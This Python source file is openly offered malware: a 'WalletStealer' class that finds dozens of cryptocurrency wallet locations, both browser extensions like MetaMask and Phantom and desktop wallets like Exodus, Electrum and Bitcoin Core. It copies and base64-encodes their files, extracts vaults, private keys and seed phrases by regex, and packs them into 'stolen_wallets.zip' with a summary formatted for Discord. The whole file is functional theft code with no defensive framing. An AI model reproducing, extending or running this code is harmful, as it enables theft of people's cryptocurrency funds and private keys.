import os
import sys
import json
import base64
import shutil
import tempfile
import sqlite3
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Any, Optional, Tuple

class WalletStealer:
    def __init__(self):
        self.appdata = os.getenv("APPDATA")
        self.localappdata = os.getenv("LOCALAPPDATA")
        self.temp_dir = tempfile.gettempdir()
        self.wallets = []
        
    def get_wallet_paths(self):
        wallet_paths = {}
        
        wallets = {
            "metamask": {
                "paths": [
                    os.path.join(self.localappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn"),
                    os.path.join(self.localappdata, "Google", "Chrome", "User Data", "Profile 1", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn"),
                    os.path.join(self.localappdata, "Microsoft", "Edge", "User Data", "Default", "Local Extension Settings", "ejbalbakoplchlghecdalmeeeajnimhm"),
                    os.path.join(self.localappdata, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn"),
                    os.path.join(self.localappdata, "Opera Software", "Opera Stable", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn")
                ],
                "type": "extension"
            },
            "phantom": {
                "paths": [
                    os.path.join(self.localappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "bfnaelmomeimhlpmgjnjophhpkkoljpa"),
                    os.path.join(self.localappdata, "Microsoft", "Edge", "User Data", "Default", "Local Extension Settings", "bfnaelmomeimhlpmgjnjophhpkkoljpa"),
                    os.path.join(self.localappdata, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Extension Settings", "bfnaelmomeimhlpmgjnjophhpkkoljpa")
                ],
                "type": "extension"
            },
            "brave_wallet": {
                "paths": [
                    os.path.join(self.localappdata, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Extension Settings", "odbfpeeihdkbihmopkbjmoonfanlbfcl")
                ],
                "type": "extension"
            },
            "coinbase_wallet": {
                "paths": [
                    os.path.join(self.localappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "hnfanknocfeofbddgcijnmhnfnkdnaad"),
                    os.path.join(self.localappdata, "Microsoft", "Edge", "User Data", "Default", "Local Extension Settings", "hnfanknocfeofbddgcijnmhnfnkdnaad")
                ],
                "type": "extension"
            },
            "binance_wallet": {
                "paths": [
                    os.path.join(self.localappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "fhbohimaelbohpjbbldcngcnapndodjp"),
                    os.path.join(self.localappdata, "Microsoft", "Edge", "User Data", "Default", "Local Extension Settings", "fhbohimaelbohpjbbldcngcnapndodjp")
                ],
                "type": "extension"
            },
            "exodus": {
                "paths": [
                    os.path.join(self.appdata, "Exodus", "exodus.wallet"),
                    os.path.join(self.appdata, "Exodus")
                ],
                "type": "desktop"
            },
            "atomic": {
                "paths": [
                    os.path.join(self.appdata, "atomic", "Local Storage", "leveldb"),
                    os.path.join(self.appdata, "Atomic")
                ],
                "type": "desktop"
            },
            "electrum": {
                "paths": [
                    os.path.join(self.appdata, "Electrum", "wallets"),
                    os.path.join(self.appdata, "Electrum")
                ],
                "type": "desktop"
            },
            "bitcoin_core": {
                "paths": [
                    os.path.join(self.appdata, "Bitcoin", "wallets"),
                    os.path.join(self.appdata, "Bitcoin")
                ],
                "type": "desktop"
            },
            "litecoin_core": {
                "paths": [
                    os.path.join(self.appdata, "Litecoin", "wallets"),
                    os.path.join(self.appdata, "Litecoin")
                ],
                "type": "desktop"
            },
            "dogecoin_core": {
                "paths": [
                    os.path.join(self.appdata, "Dogecoin", "wallets"),
                    os.path.join(self.appdata, "Dogecoin")
                ],
                "type": "desktop"
            },
            "monero": {
                "paths": [
                    os.path.join(self.appdata, "Monero", "wallets"),
                    os.path.join(self.appdata, "Monero")
                ],
                "type": "desktop"
            },
            "ryo_wallet": {
                "paths": [
                    os.path.join(self.appdata, "ryo", "ryo.wallet")
                ],
                "type": "desktop"
            },
            "daedalus": {
                "paths": [
                    os.path.join(self.appdata, "Daedalus", "wallets"),
                    os.path.join(self.appdata, "Daedalus")
                ],
                "type": "desktop"
            },
            "wasabi": {
                "paths": [
                    os.path.join(self.appdata, "WalletWasabi", "Client", "Wallets"),
                    os.path.join(self.appdata, "WalletWasabi")
                ],
                "type": "desktop"
            },
            "trust_wallet": {
                "paths": [
                    os.path.join(self.localappdata, "Trust Wallet"),
                    os.path.join(self.appdata, "Trust Wallet")
                ],
                "type": "mobile"
            }
        }
        
        for wallet_name, wallet_info in wallets.items():
            for path in wallet_info["paths"]:
                if os.path.exists(path):
                    if wallet_name not in wallet_paths:
                        wallet_paths[wallet_name] = {
                            "type": wallet_info["type"],
                            "paths": []
                        }
                    if path not in wallet_paths[wallet_name]["paths"]:
                        wallet_paths[wallet_name]["paths"].append(path)
        
        return wallet_paths
    
    def steal_extension_wallet(self, wallet_name, wallet_path):
        wallet_data = []
        
        try:
            if os.path.isdir(wallet_path):
                for root, dirs, files in os.walk(wallet_path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        
                        if file.endswith(".ldb") or file.endswith(".log") or file.endswith(".json"):
                            try:
                                with open(file_path, "rb") as f:
                                    data = f.read()
                                
                                wallet_data.append({
                                    "file": file,
                                    "path": file_path,
                                    "data": base64.b64encode(data).decode()
                                })
                            except:
                                pass
        except:
            pass
        
        return wallet_data
    
    def steal_desktop_wallet(self, wallet_name, wallet_path):
        wallet_data = []
        
        try:
            if os.path.isfile(wallet_path):
                # Single wallet file
                with open(wallet_path, "rb") as f:
                    data = f.read()
                
                wallet_data.append({
                    "file": os.path.basename(wallet_path),
                    "path": wallet_path,
                    "data": base64.b64encode(data).decode()
                })
            elif os.path.isdir(wallet_path):
                # Wallet directory
                for root, dirs, files in os.walk(wallet_path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        
                        if file.endswith(".wallet") or file.endswith(".dat") or file.endswith(".json") or file.endswith(".keys") or file.endswith(".db"):
                            try:
                                with open(file_path, "rb") as f:
                                    data = f.read()
                                
                                wallet_data.append({
                                    "file": file,
                                    "path": file_path,
                                    "data": base64.b64encode(data).decode()
                                })
                            except:
                                pass
        except:
            pass
        
        return wallet_data
    
    def extract_metamask_vault(self, data):
        try:
            # Look for vault data in LevelDB files
            if isinstance(data, bytes):
                data_str = data.decode('utf-8', errors='ignore')
            else:
                data_str = data
            
            # Find JSON-like structures
            import re
            json_pattern = r'\{[^{}]*"vault"[^{}]*\}'
            matches = re.findall(json_pattern, data_str)
            
            if matches:
                for match in matches:
                    try:
                        vault_data = json.loads(match)
                        if "vault" in vault_data:
                            return vault_data["vault"]
                    except:
                        pass
            
            return None
        except:
            return None
    
    def extract_private_keys(self, data):
        private_keys = []
        
        try:
            import re
            
            if isinstance(data, bytes):
                data_str = data.decode('utf-8', errors='ignore')
            else:
                data_str = data
            
            # Bitcoin private keys (WIF format)
            btc_pattern = r'[5KL][1-9A-HJ-NP-Za-km-z]{50,51}'
            btc_keys = re.findall(btc_pattern, data_str)
            private_keys.extend(btc_keys)
            
            # Ethereum private keys
            eth_pattern = r'0x[a-fA-F0-9]{64}'
            eth_keys = re.findall(eth_pattern, data_str)
            private_keys.extend(eth_keys)
            
            # Mnemonic phrases (12/24 words)
            mnemonic_pattern = r'(?:\b[a-z]+\b\s+){11,23}\b[a-z]+\b'
            mnemonics = re.findall(mnemonic_pattern, data_str)
            private_keys.extend(mnemonics)
            
        except:
            pass
        
        return private_keys
    
    def steal_all_wallets(self):
        all_wallets = []
        
        wallet_paths = self.get_wallet_paths()
        
        for wallet_name, wallet_info in wallet_paths.items():
            for path in wallet_info["paths"]:
                if wallet_info["type"] == "extension":
                    data = self.steal_extension_wallet(wallet_name, path)
                else:
                    data = self.steal_desktop_wallet(wallet_name, path)
                
                if data:
                    all_wallets.append({
                        "wallet": wallet_name,
                        "type": wallet_info["type"],
                        "files": data
                    })
        
        return all_wallets
    
    def format_wallets_for_discord(self, wallets, limit=50):
        formatted = []
        
        for wallet in wallets[:limit]:
            formatted.append({
                "wallet": wallet.get("wallet", ""),
                "type": wallet.get("type", ""),
                "file_count": len(wallet.get("files", []))
            })
        
        return formatted
    
    def export_wallets_to_zip(self, wallets, output_path=None):
        if output_path is None:
            output_path = os.path.join(self.temp_dir, "stolen_wallets.zip")
        
        try:
            import zipfile
            
            with zipfile.ZipFile(output_path, "w", zipfile.ZIP_DEFLATED) as zipf:
                for wallet in wallets:
                    wallet_name = wallet.get("wallet", "unknown")
                    
                    for file_info in wallet.get("files", []):
                        file_path = file_info.get("path", "")
                        file_data = base64.b64decode(file_info.get("data", ""))
                        
                        if file_path:
                            arcname = f"{wallet_name}/{os.path.basename(file_path)}"
                        else:
                            arcname = f"{wallet_name}/{file_info.get('file', 'unknown')}"
                        
                        zipf.writestr(arcname, file_data)
            
            return output_path
        except:
            return None
    
    def get_wallet_summary(self, wallets):
        summary = {}
        
        for wallet in wallets:
            wallet_name = wallet.get("wallet", "unknown")
            file_count = len(wallet.get("files", []))
            summary[wallet_name] = file_count
        
        return summary
    
    def steal_all(self):
        wallets = self.steal_all_wallets()
        
        return {
            "total_wallets": len(wallets),
            "wallets": wallets,
            "summary": self.get_wallet_summary(wallets)
        }

if __name__ == "__main__":
    stealer = WalletStealer()
    data = stealer.steal_all()
    print(f"Total wallets found: {data['total_wallets']}")
    print(json.dumps(data['summary'], indent=2))